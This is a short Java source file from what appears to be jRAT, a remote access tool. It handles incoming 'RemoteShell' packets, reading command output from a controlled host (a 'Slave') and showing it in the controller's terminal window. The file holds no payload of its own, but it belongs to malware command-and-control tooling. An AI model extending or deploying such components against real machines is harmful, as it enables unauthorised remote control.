package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;
import se.jrat.controller.ui.frames.FrameRemoteShell;


public class Packet21RemoteShell extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String command = slave.readLine();
		
		FrameRemoteShell frame = FrameRemoteShell.INSTANCES.get(slave);
		
		if (frame != null) {
			frame.getTerminal().append(command + "\n");
		}

	}

}
